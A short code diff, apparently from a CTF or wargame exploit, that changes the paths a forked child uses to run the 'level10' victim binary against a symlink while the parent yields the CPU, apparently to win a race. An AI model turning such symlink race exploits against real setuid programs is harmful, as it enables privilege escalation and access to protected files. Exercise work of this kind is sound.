@@ -10,7 +10,7 @@ int main()
     // Let the victim run
     if (fork() == 0)
     {
-        system("./level10 activedir/lnk 127.0.0.1");
+        system("~/level10 ~/activedir/lnk 127.0.0.1");
         exit(0);
     }
     usleep(1); // yield CPU
